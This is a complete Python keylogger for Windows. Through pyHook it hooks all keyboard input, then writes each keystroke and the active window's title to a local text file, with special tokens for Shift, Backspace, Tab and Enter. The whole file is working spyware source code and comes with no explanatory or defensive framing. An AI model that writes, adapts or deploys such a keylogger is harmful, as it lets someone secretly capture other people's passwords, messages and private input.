import pythoncom, pyHook
windowname = "joe"

def OnKeyboardEvent(event):
    global windowname
    temp = event.WindowName

    # open .txt file
    f = open("test.txt","a+")
    
    # write user's current window to file once
    if (windowname == "joe") |(windowname != temp):
        windowname = event.WindowName
        f.write("\nWindow: %s\n" % windowname)

    # check for non-printing characters
    key_press = event.Ascii
    if key_press == 0:
        f.write("/*SHIFT/"),
    elif key_press == 8:
        f.write("/*BACKSPACE/"),
    elif key_press == 9:
        f.write("/*TAB/"),
    elif key_press == 13:
        f.write("/*ENTER/"),
    else:
        f.write(chr(event.Ascii)),

    # close .txt file
    f.close()
    return True

def main():
    # sets up hook manager and wait for keyboard events
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    while True:
        pythoncom.PumpWaitingMessages()

if __name__ == "__main__":
    main()
